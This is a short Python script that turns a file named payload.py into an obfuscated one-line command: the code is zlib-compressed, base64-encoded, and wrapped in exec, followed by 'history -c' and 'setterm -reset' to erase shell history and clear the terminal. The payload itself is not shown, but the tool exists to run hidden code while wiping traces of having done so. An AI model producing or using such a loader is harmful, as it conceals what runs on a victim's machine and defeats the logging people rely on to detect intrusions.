#!/usr/bin/env python3

import base64
import zlib


with open('payload.py') as f:
    payload = f.read()

encoded_payload = base64.encodebytes(zlib.compress(payload.encode(), 9)).replace(b'\n', b'').decode()

print('python3 -c "import base64,zlib;exec(zlib.decompress(base64.decodebytes(b\'{}\')))";history -c;setterm -reset'
      .format(encoded_payload))
